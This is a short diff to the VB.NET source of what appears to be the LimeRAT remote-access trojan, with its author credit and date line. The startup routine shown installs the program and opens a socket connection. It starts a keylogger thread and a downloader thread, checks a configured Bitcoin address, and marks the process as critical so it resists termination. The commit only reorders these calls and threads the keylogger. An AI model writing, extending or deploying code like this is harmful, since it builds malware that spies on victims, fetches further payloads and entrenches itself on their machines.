@@ -1,5 +1,5 @@
 ﻿'##################################################################
-'##         N Y A N   C A T  |||   Updated on Aug/09/2018        ##
+'##         N Y A N   C A T  |||   Updated on Aug/11/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -65,8 +65,6 @@ Namespace Lime
 
             Call C_Installation.INS()
 
-            C_CriticalProcesses.CriticalProcesses_Enable()
-
             C_Socket.T1.Start()
 
             If C_Settings.BTC_ADDR.Length > 25 Then
@@ -89,10 +87,13 @@ Namespace Lime
             CHK.Start()
 
             Dim KL As New C_Keylog
-            KL.Start()
+            Dim KT As New Threading.Thread(AddressOf KL.WRK)
+            KT.Start()
 
             Dim DW As Threading.Thread = New Threading.Thread(AddressOf Downloader)
             DW.Start()
+
+            C_CriticalProcesses.CriticalProcesses_Enable()
 
             AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf Handler_SessionEnding
 
